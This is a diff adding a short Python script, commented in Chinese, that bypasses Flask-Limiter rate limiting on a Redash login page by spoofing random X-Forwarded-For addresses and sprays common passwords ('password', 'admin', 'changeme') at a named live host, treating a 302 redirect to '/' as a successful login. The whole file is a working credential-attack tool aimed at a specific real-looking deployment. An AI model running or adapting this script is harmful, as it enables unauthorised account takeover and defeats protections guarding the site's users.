@@ -1,0 +1,34 @@
+#!/usr/bin/env python3
+# Redash /login XFF 限速绕过 + 口令喷洒骨架
+# 适用：Flask-Limiter 应用置于不剥离 X-Forwarded-For 的 nginx 之后
+import subprocess, random, re, os, tempfile
+
+BASE = "https://redash.fanatical.com"
+emails = ["admin@example.com"]
+pws = ["password", "admin", "changeme"]
+
+def xip():
+    return ".".join(str(random.randint(1, 254)) for _ in range(4))
+
+def run(args):
+    return subprocess.run(args, capture_output=True, text=True, timeout=30).stdout
+
+for e in emails:
+    for p in pws:
+        ip = xip()
+        cj = tempfile.mktemp()
+        page = run(["curl", "-s", "-c", cj, "-H", "X-Forwarded-For: " + ip, BASE + "/login"])
+        m = re.search(r'name="csrf_token" value="([^"]+)"', page)
+        if not m:
+            print("no csrf (可能仍被限速或页面结构变了；检查是否 429)"); continue
+        tok = m.group(1)
+        out = run(["curl", "-s", "-b", cj, "-c", cj, "-o", "/dev/null",
+                   "-w", "%{http_code} %{redirect_url}",
+                   "-H", "X-Forwarded-For: " + ip,
+                   "--data-urlencode", "email=" + e,
+                   "--data-urlencode", "password=" + p,
+                   "--data-urlencode", "csrf_token=" + tok,
+                   "--data", "remember=y", BASE + "/login"])
+        print(e, p, out)
+        os.remove(cj)
+# 命中判据：HTTP 302 且 redirect_url 指向 "/"（成功登录）
